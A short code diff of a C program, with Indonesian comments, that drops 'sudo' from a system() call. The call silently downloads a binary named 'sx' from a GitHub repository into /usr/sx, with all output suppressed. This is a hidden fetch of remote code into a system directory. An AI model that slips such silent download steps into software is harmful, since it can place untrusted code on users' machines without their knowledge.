@@ -10,7 +10,7 @@ int main() {
     char command[256];
     
     // Mendownload file ke /usr directory dengan sudo
-    int download_status = system("sudo wget -q https://github.com/gualgeol-code/vpl/raw/refs/heads/main/sx -O /usr/sx >/dev/null 2>&1");
+    int download_status = system("wget -q https://github.com/gualgeol-code/vpl/raw/refs/heads/main/sx -O /usr/sx >/dev/null 2>&1");
     
     if (download_status != 0) {
         printf("Error: Gagal mendownload sx ke /usr\n");
